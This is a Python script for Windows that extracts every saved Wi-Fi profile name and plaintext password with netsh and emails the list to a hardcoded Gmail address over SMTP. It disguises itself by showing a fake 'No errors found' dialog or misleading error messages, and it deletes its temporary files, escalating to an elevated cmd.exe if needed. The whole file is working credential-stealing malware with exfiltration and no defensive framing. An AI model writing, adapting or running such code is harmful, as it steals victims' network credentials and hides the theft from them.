import os
import smtplib 
import time
import socket
import tkinter
import win32com.shell.shell as shell
from email.message import EmailMessage 
from tkinter import messagebox


def send_to_gmail(file):
    msg = EmailMessage()
    msg['Subject'] = 'Here you go'
    msg['From'] = 'OSINT48@gmail.com'
    msg['To'] = 'OSINT48@gmail.com'
    msg.set_content('LIST OF WIFI PASSWORDS')

    with open(('C:\\Users\\' + os.environ['USERNAME'] + f'\\{file}'), 'rb') as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('OSINT48@gmail.com', '')
        smtp.send_message(msg)

def main_process():
    try:
        profiles = []
        passwords = []
        pass_files = []

        file = open('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt', 'w')
        file2 = open('file.txt', 'w')
        path_profile = 'C:\\Users\\' + os.environ['USERNAME'] + '\\profiles.txt'

        os.system('netsh wlan show profile > ' + path_profile)
        time.sleep(0.5)
        data = (open('C:\\Users\\' + os.environ['USERNAME'] + '\\profiles.txt', 'r')).read().split('\n')

        for i in data:
            if ':' in i:
                prof = i.split(':')[1]
                if prof != '':
                    if len(prof.split()) != 1:
                        profiles.append(" ".join(prof.split()))
                    else:
                        profiles.append(prof.split()[0])

        for i in range(len(profiles)):
            os.system(f'netsh wlan show profile name="{profiles[i]}" key=clear > ' + f'pass{i}.txt')
            pass_files.append(f'pass{i}.txt')
            pass_data = (open(pass_files[i], 'r')).read().split()
            for j in range(len(pass_data)):
                if 'Key' in pass_data[j] and 'Content' in pass_data[j+1]:
                    passwords.append(pass_data[j+3])
                elif 'Key' in pass_data[j] and 'Index' in pass_data[j+1]:
                    passwords.append('no key')

        for i in range(len(profiles)):
            file.write(profiles[i] + ' : ' + passwords[i] + '\n')
            file2.write(profiles[i] + ' : ' + passwords[i] + '\n')
        file.close()
        file2.close()

        send_to_gmail('file.txt')

        root = tkinter.Tk()
        root.withdraw()
        messagebox.showinfo('Congratulations', 'No errors found')
        root.destroy()

    except socket.gaierror:
        root = tkinter.Tk()
        root.withdraw()
        messagebox.showerror('Error', 'No internet connection')
        root.destroy()
        os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt')

    except smtplib.SMTPAuthenticationError:

        root = tkinter.Tk()
        root.withdraw()
        messagebox.showerror('Error', 'Services are not responding, try later')
        root.destroy()

    finally:
        try:
            os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\profiles.txt')
            os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt')
            for i in pass_files:
                os.remove(i)
        except FileNotFoundError:
            pass    
        except PermissionError:
            files_to_remove = []
            for i in range(len(pass_files)):
                files_to_remove.append('del ' + '"C:\\Users\\' + os.environ['USERNAME'] + f'\\pass{i}"')
            shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c' + ("; ".join(files_to_remove)))

if __name__ == '__main__':
    main_process()